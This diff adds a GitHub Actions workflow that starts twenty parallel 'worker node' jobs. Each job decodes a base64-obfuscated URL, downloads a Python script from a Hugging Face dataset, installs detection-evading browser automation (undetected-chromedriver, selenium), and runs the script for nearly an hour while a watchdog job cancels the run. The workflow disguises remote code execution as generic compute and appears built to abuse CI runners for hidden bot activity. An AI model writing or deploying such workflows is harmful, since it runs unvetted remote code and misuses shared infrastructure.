@@ -1,0 +1,108 @@
+name: Horizon Flux Engine Core
+
+on:
+  workflow_dispatch:
+
+concurrency:
+  group: flux-engine-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # Watchdog: يراقب الوقت لمدة 59 دقيقة ثم يلغي إجراءات سير العمل
+  # =================================================================
+  flux-watchdog:
+    name: "System Watchdog Supervisor"
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    env:
+      WATCHDOG_TIMEOUT_SEC: 3540
+    steps:
+      - name: Initialize Watchdog Monitor
+        run: |
+          echo "[MONITOR] Watchdog activated for process: ${{ github.run_id }}"
+          echo "[MONITOR] Countdown initiated for ${WATCHDOG_TIMEOUT_SEC} seconds."
+
+          sleep "${WATCHDOG_TIMEOUT_SEC}"
+
+          echo "[MONITOR] Timeout window reached — triggering abort signal."
+
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+
+          echo "[MONITOR] Abort signal dispatched successfully."
+
+  # =================================================================
+  # Grid Compute: تشغيل متوازي لعقد الحوسبة المستقلة
+  # =================================================================
+  grid-compute:
+    name: "WorkerNode-${{ matrix.node_code }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 59
+
+    strategy:
+      fail-fast: false
+      matrix:
+        node_code: [
+          "A101", "B102", "C103", "D104", "E105", 
+          "F106", "G107", "H108", "I109", "J110", 
+          "K111", "L112", "M113", "N114", "O115", 
+          "P116", "Q117", "R118", "S119", "T120"
+        ]
+
+    steps:
+      # -----------------------------------------------------------------
+      # المرحلة 1: إعداد وتجهيز النظام
+      # -----------------------------------------------------------------
+      - name: Setup System Dependencies
+        run: |
+          echo "[SETUP] Bootstrapping WorkerNode-${{ matrix.node_code }} environment..."
+          sudo apt-get update -qq
+          sudo apt-get install -y curl python3-pip
+
+      # -----------------------------------------------------------------
+      # المرحلة 2: سحب البرنامج التنفيذي
+      # -----------------------------------------------------------------
+      - name: Fetch Executable Artifact
+        run: |
+          echo "[FETCH] Pulling target payload from external repository..."
+          TARGET_URL=$(printf '%s' "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
+          curl -sL "$TARGET_URL" -o app_runner.py
+          echo "[FETCH] Payload received successfully."
+
+      # -----------------------------------------------------------------
+      # المرحلة 3: تثبيت المكتبات البرمجية المطلوبة
+      # -----------------------------------------------------------------
+      - name: Install Python Requirements
+        run: |
+          echo "[DEPENDENCIES] Installing required Python packages..."
+          pip3 install -q undetected-chromedriver selenium requests psutil
+
+      # -----------------------------------------------------------------
+      # المرحلة 4: تشغيل العمليات وإدارة دورة الحياة
+      # -----------------------------------------------------------------
+      - name: Execute Main Task
+        run: |
+          echo "[EXECUTE] Starting runner process on WorkerNode-${{ matrix.node_code }}..."
+
+          python3 app_runner.py &
+          TASK_PID=$!
+
+          echo "[EXECUTE] Task started with PID: ${TASK_PID}. Max execution time set to 3540s."
+
+          sleep 3540
+
+          if kill -0 "$TASK_PID" 2>/dev/null; then
+            echo "[EXECUTE] Execution time exceeded — terminating PID: ${TASK_PID}."
+            kill -9 "$TASK_PID"
+            echo "[EXECUTE] Process force-killed by execution controller."
+          else
+            echo "[EXECUTE] Task finished naturally prior to timeout."
+          fi
